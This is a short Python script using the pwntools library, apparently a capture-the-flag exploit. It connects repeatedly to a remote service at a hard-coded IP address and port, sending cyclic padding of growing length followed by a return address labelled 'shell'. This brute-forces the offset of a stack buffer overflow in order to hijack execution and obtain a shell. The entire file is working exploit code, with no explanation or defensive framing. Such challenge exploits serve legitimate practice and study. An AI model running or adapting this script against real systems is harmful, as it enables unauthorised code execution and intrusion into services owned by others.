from pwn import *

# context.log_level = "debug"
shell = 0x40060d

for i in range(1000):
    r = remote("111.200.241.244", 62243)
    log.info("payload lenth:" + str(i))
    try:
        r.sendlineafter(b">", cyclic(i) + p64(shell))
        print(r.recv())
    except:
        pass